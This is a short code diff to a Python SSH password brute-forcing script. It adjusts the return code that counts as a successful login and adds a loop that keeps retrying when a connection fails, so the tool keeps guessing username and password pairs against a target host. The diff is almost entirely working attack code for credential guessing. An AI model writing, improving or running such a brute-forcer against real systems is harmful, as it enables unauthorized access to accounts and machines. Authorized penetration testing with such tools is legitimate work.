@@ -134,10 +134,21 @@ def main():
             tmp_pwd = p.strip()
             print("Trying: ", tmp_usr + ":" + tmp_pwd)
             result = ssh_connect(host, tmp_usr, tmp_pwd)
-            if result == 1:
+            if result == 0:
                 print("Successfully found: %s:%s" % (tmp_usr, tmp_pwd))
                 done = True
                 break
+            elif  result == 2:
+                while True:
+                    print("Could not establish connection. Retrying...")
+                    result = ssh_connect(host, tmp_usr, tmp_pwd)
+                    if result == 0:
+                        print("Successfully found: %s:%s" % (tmp_usr, tmp_pwd))
+                        done = True
+                        break
+                    elif result != 2:
+                        break
+                continue
 
             if not store_session(idx_usr, idx_pwd):
                 print("Could not save current session.")
